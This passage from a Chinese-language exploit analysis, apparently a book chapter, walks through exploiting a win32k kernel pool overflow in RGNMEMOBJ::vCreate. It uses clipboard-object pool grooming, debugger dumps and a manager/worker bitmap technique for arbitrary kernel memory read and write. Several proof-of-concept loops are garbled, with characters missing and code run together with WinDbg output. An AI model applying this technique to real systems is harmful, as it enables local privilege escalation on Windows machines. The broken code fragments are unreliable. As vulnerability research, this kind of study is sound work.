      if ( a2 >= 0xFFFFFFF4 )
        v2 = 12;
      if ( v2 >= a2 && (v3 = HMAllocObject(0, 0, 6, v2), (v4 = (int *)v3) != 0) )
      {
        *(_DWORD *)(v3 + 8) = a2;
        memcpy((void *)(v3 + 0xC), a1, a2);
        result = *v4;
      }
清单 5-19 函数 ConvertMemHandle 调用 HMAllocObject 以分配对象
在 `ConvertMemHandle` 函数调用返回后，函数 `SetClipboardData` 将返回的剪贴板数据对象的句柄传入
`NtUserSetClipboardData` 函数调用中，以将分配的剪贴板数据对象设置进剪贴板。
    LABEL_41:
      v3 = (HANDLE)ConvertMemHandle(hMem, 1);
      v12 = 1;
    LABEL_29:
      if ( !v3 )
        return 0;
    LABEL_2:
      RtlEnterCriticalSection(&gcsClipboard);
      v10 = v12;
      v11 = 1;
      if ( !NtUserSetClipboardData(uFormat, v3, &v10) )
      {
        RtlLeaveCriticalSection(&gcsClipboard);
        return 0;
      }
清单 5-20 函数 SetClipboardData 调用 NtUserSetClipboardData 以设置剪贴板
在不调用函数 `OpenCliboard` 并清空剪贴板数据的前提下调用 `SetClipboardData`
函数会发生潜在的内存泄露，被分配的剪贴板数据对象在当前活跃会话生命周期内将会一直存在于分页会话池当中。但正因为这个特性，在后续通过漏洞溢出覆盖该对象的数据结构之后，不用担心在会在发生销毁对象时触发异常的问题，内存泄露的问题只能作为该验证代码的一个小缺憾。
图 5-7 创建剪贴板数据对象作为垫片
在测试环境中执行验证代码时，发现执行到第 `2` 次分配位图对象的后期阶段发生创建失败的错误，经过检查后发现是进程 GDI
对象数目已达到上限，随后适当调整验证代码的创建对象整体数目才得以继续执行。在实际应用时可随时根据进程句柄数、用户对象数、GDI
对象数具体情况随时调整选择分配的对象类型，以使利用逻辑能顺利进行下去。在当前系统环境下，用户对象和 GDI 对象的进程限额都是 `10000`
个，参见以下两个注册表路径的键值，如有必要可适当调整这两个键值的数值。
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\GDIProcessHandleQuota
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\USERProcessHandleQuota
图 5-8 用户对象和 GDI 对象的进程限额
修改后的验证代码片段如下：
    for (LONG i = 0; i  0; i -= min(maxLimit, i))
    {
        ret = PolylineTo(hdc, &point[maxCount - i], min(maxLimit, i));
    }
    ret = EndPath(hdc);
    // 0xF90+0x70=0x1000
    for (LONG i = 0; i  dd esp l 14
    93967828  00000021 00000068 6e677247 0f0106b6
    kd> p
    win32k!RGNMEMOBJ::vCreate+0xcb:
    93fe4002 8b5510          mov     edx,dword ptr [ebp+10h]
    kd> r eax
    eax=cae5df98
    kd> !pool cae5d000+1000
    Pool page cae5e000 region is Paged session pool
    *cae5e000 size:  b70 previous size:    0  (Allocated) *Uscb
             Pooltag Uscb : USERTAG_CLIPBOARD, Binary : win32k!_ConvertMemHandle
     cae5eb70 size:  420 previous size:  b70  (Allocated)  Gh15
     cae5ef90 size:   70 previous size:  420  (Free )  Usac Process: 861fcaa8
    kd> dc cae5eb70 l 10 
    cae5eb70  4684016e 35316847 02050ff1 00000000  n..FGh15........
    cae5eb80  00000000 00000000 00000000 02050ff1  ................
    cae5eb90  00000000 00000000 00000001 000000b1  ................
    cae5eba0  000002c4 cae5eccc cae5eccc 00000004  ................
    kd> p
    ...
    win32k!RGNMEMOBJ::vCreate+0x1d7:
    93fe410e e8a7000d00      call    win32k!vConstructGET (940b41ba)
    kd> p
    win32k!RGNMEMOBJ::vCreate+0x1dc:
    93fe4113 8365cc00        and     dword ptr [ebp-34h],0
    kd> dc cae5eb70 l 10 
    cae5eb70  ffffffff ffffffff cae5df98 00000005  ................
    cae5eb80  00000000 00000000 ffffffff 00000300  ................
    cae5eb90  00000500 0147ae14 00000001 ffffffff  ......G.........
    cae5eba0  000002c4 cae5eccc cae5eccc 00000004  ................
清单 5-22 成员 sizlBitmap 已被覆盖成感兴趣的值
这样一来，成员 `sizlBitmap.cx` 和 `sizlBitmap.cy` 被覆盖成 `0x01` 和 `0xFFFFFFFF`，而
`pvScan0` 成员的值并未被污染，我们就可以利用该 `sizlBitmap.cy`
成员值的广阔范围，将当前位图表面对象作为主控位图对象，通过其对位于下一内存页中的位图表面对象进行操作，将其作为扩展位图表面对象，覆盖其 `pvScan0`
指针为我们想读写的地址，随后再通过 API 函数操作扩展位图表面对象，实现“指哪打哪”的目的。
    kd> !pool cae5d000+2000
    Pool page cae5f000 region is Paged session pool
    *cae5f000 size:  b70 previous size:    0  (Allocated) *Uscb
             Pooltag Uscb : USERTAG_CLIPBOARD, Binary : win32k!_ConvertMemHandle
     cae5fb70 size:  420 previous size:  b70  (Allocated)  Gh15
     cae5ff90 size:   70 previous size:  420  (Free )  Usac Process: 861fcaa8
    kd> dc cae5fb70 l 10
    cae5fb70  4684016e 35316847 02050fb2 00000000  n..FGh15........
    cae5fb80  00000000 00000000 00000000 02050fb2  ................
    cae5fb90  00000000 00000000 00000001 000000b1  ................
    cae5fba0  000002c4 cae5fccc cae5fccc 00000004  ................
清单 5-23 下一内存页中的位图表面对象内存块
* * *
**定位主控位图句柄**
漏洞触发之前的代码逻辑已万事俱备，接下来处理漏洞触发之后的工作。既然要利用当前的主控位图表面对象，就要找它到是我们分配的大量的位图对象中的哪一个。这就需要用到
`GetBitmapBits` 函数，其函数原型如下：
    LONG GetBitmapBits(
      _In_  HBITMAP hbmp,
      _In_  LONG    cbBuffer,
      _Out_ LPVOID  lpvBits
    );
通过向 `GetBitmapBits`
函数传入位图句柄、读取位图字节数、存储位图数据的缓冲区，将会读出指定大小的位图数据，并将实际读取的数据作为返回值返回。通过 `GetBitmapBits`
函数获取位图像素位数据具有如下的主要调用路径：
图 5-9 通过 GetBitmapBits 获取位图像素位数据的主要调用路径
在函数 `win32k!NtGdiGetBitmapBits` 中首先向 `GreGetBitmapBits`
函数调用传入空的请求字节数和缓冲区指针以获取该位图表面对象的像素位数据的实际大小，用来防止传递给 `GetBitmapBits`
的请求字节数参数超过位图像素位数据的实际大小。在函数 `GreGetBitmapBits`
中只通过如下的赋值语句计算位图像素位数据的大小作为返回值而直接返回：
    v4 = *((_DWORD *)pSurf + 9) * (((_DWORD)(*((_DWORD *)pSurf + 8) * gaulConvert[*((_DWORD *)pSurf + 0xF)] + 15) >> 3) & 0x1FFFFFFE);
变量 `pSurf` 是栈上的 `SURFREF` 类对象中第一个成员变量 `SURFACE *ps` 指针，指向该 `SURFREF` 对象关联的
`SURFACE` 类对象；该 `SURFREF` 对象是在函数开始时通过 `HBITMAP a1`
参数构造初始化并关联的。上面的赋值语句获取主控位图表面对象相关的 `SURFACE->so.iBitmapFormat`
成员域的数值，并将数值作为索引在全局数组 `gaulConvert` 获取该位图格式的像素点位数，随后进行逻辑对齐运算并计算与
`SURFACE->so.sizlBitmap`
成员中横向和纵向像素点个数的乘积，得到该位图对象的像素点数据实际大小。需要留意的是，赋值语句中计算实际大小的关键在于